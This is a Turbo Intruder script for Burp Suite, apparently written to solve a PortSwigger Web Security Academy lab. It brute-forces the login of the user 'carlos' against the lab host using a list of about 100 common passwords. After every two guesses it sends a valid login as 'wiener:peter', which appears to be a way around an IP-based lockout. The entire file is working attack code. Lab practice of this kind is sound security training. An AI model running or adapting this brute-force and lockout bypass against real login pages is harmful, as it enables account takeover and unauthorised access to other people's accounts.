def queueRequests(target, _):
    engine = RequestEngine(
        endpoint="https://0a0e00210386a90b81b849f700aa0039.web-security-academy.net:443",
        concurrentConnections=1,
        requestsPerConnection=1,
        engine=Engine.BURP 
    )

    pass_list = ["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow"]
    
    attack_request = """POST /login HTTP/2
Host: 0a0e00210386a90b81b849f700aa0039.web-security-academy.net
Content-Length: 29

username=carlos&password=%s"""

    valid_request = """POST /login HTTP/2
Host: 0a0e00210386a90b81b849f700aa0039.web-security-academy.net
Content-Length: 30

username=wiener&password=peter"""

    for i in range(0, len(pass_list), 2):
        try:
            engine.queue(attack_request % pass_list[i])
            
            if i + 1 < len(pass_list):
                engine.queue(attack_request % pass_list[i + 1])

            engine.queue(valid_request)

        except IndexError:
            pass

def handleResponse(req, _):
    table.add(req)
